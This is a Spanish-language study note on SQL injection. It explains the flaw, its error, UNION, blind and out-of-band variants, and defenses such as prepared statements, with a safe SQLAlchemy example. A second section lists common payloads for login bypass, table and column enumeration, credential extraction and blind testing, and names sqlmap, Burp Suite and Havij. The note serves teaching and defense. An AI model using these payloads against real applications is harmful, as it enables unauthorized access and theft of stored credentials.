#Software #Hacking #Computación #Programación 
## Inyección [[SQL]] (SQL Injection)

### 🔹 **¿Qué es la inyección SQL?**

La inyección SQL es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante manipular las consultas SQL enviadas a la base de datos. Ocurre cuando los datos ingresados por el usuario no son validados ni sanitizados correctamente, permitiendo ejecutar comandos maliciosos en la base de datos.

### 🔹 **¿Cómo funciona?**

Los ataques de inyección SQL explotan la concatenación directa de entradas de usuario en las consultas SQL. Por ejemplo:

```sql
SELECT * FROM usuarios WHERE usuario = 'admin' AND contraseña = '12345';
```

Si la aplicación no valida los datos, un atacante podría ingresar lo siguiente en el campo de contraseña:

```sql
' OR '1'='1
```

Lo que generaría una consulta maliciosa como:

```sql
SELECT * FROM usuarios WHERE usuario = 'admin' AND contraseña = '' OR '1'='1';
```

Dado que `'1'='1'` es siempre **verdadero**, el atacante podría acceder sin conocer la contraseña.

### 🔹 **Tipos de inyección SQL**

1. **Inyección basada en error**: El atacante provoca errores en la base de datos para obtener información sensible.
    
2. **Inyección UNION**: Se usa `UNION` para combinar resultados y extraer datos.
    
3. **Inyección a ciegas (Blind SQL Injection)**: No muestra errores, pero permite inferir información a través de respuestas booleanas o temporales.
    
4. **Inyección fuera de banda**: Usa canales externos (como DNS o HTTP) para exfiltrar datos.
    

### 🔹 **Cómo prevenir la inyección SQL**

✅ **Usar consultas preparadas (Prepared Statements)**  
✅ **Validar y sanitizar entradas de usuario**  
✅ **Restringir permisos en la base de datos**  
✅ **Evitar mostrar errores detallados al usuario**  
✅ **Usar un firewall de aplicaciones web (WAF)**

### 🔹 **Ejemplo de código seguro en Python con SQLAlchemy**
```python
from sqlalchemy import text

query = text("SELECT * FROM usuarios WHERE usuario = :usuario AND contraseña = :contraseña")
resultado = conexion.execute(query, {"usuario": usuario, "contraseña": contraseña})
```

Este método evita la inyección SQL al tratar los datos como parámetros en lugar de concatenar texto.

## Payloads en Inyección SQL (SQLi)

### 🔹 **¿Qué es un payload en SQLi?**

Un **payload** es una cadena de código malicioso diseñada para explotar una vulnerabilidad de **inyección SQL** (SQLi). Estos payloads manipulan las consultas SQL para extraer datos, evadir autenticaciones o incluso modificar la base de datos.

### 🔹 **Ejemplos de Payloads Comunes**

A continuación, algunos de los payloads más utilizados según el tipo de inyección SQL:

#### **1️⃣ Autenticación Bypass (Saltarse el login)**

```sql
' OR '1'='1' --
```

Este payload siempre evalúa como **verdadero** y permite el acceso sin necesidad de una contraseña.

#### **2️⃣ Enumeración de tablas con UNION**

```python
' UNION SELECT null, table_name FROM information_schema.tables --
```

Este payload permite listar las tablas de la base de datos.

#### **3️⃣ Enumeración de columnas**

```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' -- 
```

Este payload extrae los nombres de las columnas de una tabla específica.

#### **4️⃣ Extraer credenciales**

```sql
' UNION SELECT usuario, contraseña FROM usuarios --
```

Permite obtener los nombres de usuario y contraseñas almacenados en la base de datos.

#### **5️⃣ Inyección SQL a ciegas (Blind SQLi)**

✅ **Basada en booleanos (true/false)**

```sql
' AND 1=1 --  (Devuelve datos) ' AND 1=2 --  (No devuelve datos)
```

✅ **Basada en tiempos (Time-Based)**

```sql
' OR IF(1=1, SLEEP(5), 0) --
```

Si la consulta tarda en responder, significa que es vulnerable a SQLi.

### 🔹 **Herramientas para probar Payloads**

- **sqlmap** (automatiza la detección y explotación de SQLi)
    
- **Burp Suite** (permite interceptar y modificar peticiones web)
    
- **Havij** (herramienta de inyección SQL automatizada)
    

### 🔹 **Cómo prevenir los ataques con payloads SQLi**

✅ **Usar consultas preparadas (Prepared Statements)**  
✅ **Evitar la concatenación de strings en SQL**  
✅ **Validar y sanitizar entradas de usuario**  
✅ **Restringir permisos en la base de datos**  
✅ **Monitorear actividad inusual en la BD**